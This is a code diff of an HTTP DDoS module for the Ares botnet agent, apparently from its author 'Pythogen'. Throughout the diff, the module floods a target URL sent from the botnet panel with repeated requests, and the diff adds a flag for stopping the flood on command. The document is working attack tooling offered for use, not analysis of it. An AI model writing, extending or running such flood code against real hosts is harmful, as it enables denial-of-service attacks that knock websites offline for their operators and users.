@@ -1,10 +1,10 @@
-# Ares DDoS Module
+# Ares HTTP-DDoS Module
 # Pythogen
-# Working, but not finished.
-# Build 1.1
+# Build 1.2
 
-# Bug fix: DDoS completion notice now correctly synchronized.
+# 12/27/2015 - 4:34 PM - Bug fix: DDoS completion notice now correctly synchronized.
 
+# 12/27/2015 - 4:42 PM - Update: Functional stop now feature included.
 
 # Panel command:
 
@@ -13,7 +13,6 @@
 # ddos http://something.com/ 10000
 
 # Make sure to include 'ddos' to MODULES array in agent.py
-
 
 
 # - Import Modules -
@@ -55,15 +54,20 @@ def auto_send_request(server, number_of_requests=10):
 
     for z in range(number_of_requests):
         try:
-            urlopen(server)
-            # Successful connection
-            stdout.write(".") # indicated by period
-            # Increment
-            inc = inc + 1 # Count total requests sent
-            # When all requests have been sent..
-            if inc == (requests):
-                # Process complete
-                complete()
+            # Is it active?
+            if isDos == True:
+                urlopen(server)
+                # Successful connection
+                stdout.write(".") # indicated by period
+                # Increment
+                inc = inc + 1 # Count total requests sent
+                # When all requests have been sent..
+                if inc == (requests):
+                    # Process complete
+                    complete()
+            # if not active then break
+            elif isDos == False:
+                break
                 
         except IOError:
             # Failed connection
@@ -89,14 +93,18 @@ def run(action, num_req):
     # Globalize increment and request variables
     global requests
     global inc
-
+    global isDos
     # inc initially set to 0
     inc = 0
+    # isDos boolean
+    isDos = False
 
     # If command passed is not 'stop' then it's a host
     if action != "stop":
         utils.send_output("DDoS Started.")
         
+        # Determines if stresser is active
+        isDos = True
         # Argument passed from Ares panel
         server = action # Host put in server
         # Number of requests
@@ -106,8 +114,10 @@ def run(action, num_req):
         flood(server, requests)
 
 
-        # Halt process [unimplemented]
+    # Halt process [unimplemented]
     elif action == "stop":
+        # Turn it off
+        isDos = False
         utils.send_output('DDoS Stopped.')
     else:
 
@@ -117,9 +127,10 @@ def run(action, num_req):
 
 
 def help():
+    # Some command details
     help_text = """
     Usage: ddos [host] [requests]|stop
-    HTTP DDoS
+    Starts HTTP DDoS.
 
     """
     return help_text
